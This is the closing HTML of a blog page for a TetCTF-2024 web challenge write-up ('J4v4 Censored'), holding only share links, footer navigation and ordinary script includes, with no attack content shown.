+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&text=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&is_video=false&description=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&name=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule&description=preface%20Hi%21%20b%c3%a0i%20n%c3%a0y%20m%c3%acnh%20s%e1%ba%bd%20writeup%20l%e1%ba%a1i%20b%c3%a0i%20J4v4%20Censored%20trong%20gi%e1%ba%a3i%20TetCTF-2024%20m%c3%a0%20team%20m%c3%acnh%20%28KCSC%29%20%c4%91%c3%a3%20solve%20%c4%91%c6%b0%e1%bb%a3c.%20%c4%90%c3%a2y%20l%c3%a0%201%20b%c3%a0i%20java%20m%c3%acnh%20%c4%91%c3%a1nh%20gi%c3%a1%20kh%c3%b4ng%20qu%c3%a1%20kh%c3%b3%20nh%c6%b0ng%20l%e1%ba%a1i%20l%c3%a0%20half-black-box%20n%c3%aan%20ph%e1%ba%a3i%20%c4%91o%c3%a1n%2c%20fuzzing%20kh%c3%a1%20nhi%e1%bb%81u%20n%c3%aan%20khi%20l%c3%a0m%20m%c3%acnh%20kh%c3%a1%20n%e1%ba%a3n%20nh%c6%b0ng%20c%c5%a9ng%20nh%e1%bb%9d%20c%c3%b3%20teammates%20quy%e1%ba%bft%20t%c3%a2m%20t%c3%acm%20ra%20%c4%91%c6%b0%e1%bb%a3c%20unintended%20solution%20n%c3%aan%20may%20m%e1%ba%afn%20%28c%c5%a9ng%20ch%c3%adnh%20l%c3%a0%20team%20duy%20nh%e1%ba%a5t%29%20solved%20%c4%91%c6%b0%e1%bb%a3c." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&t=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  devme4f blogs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
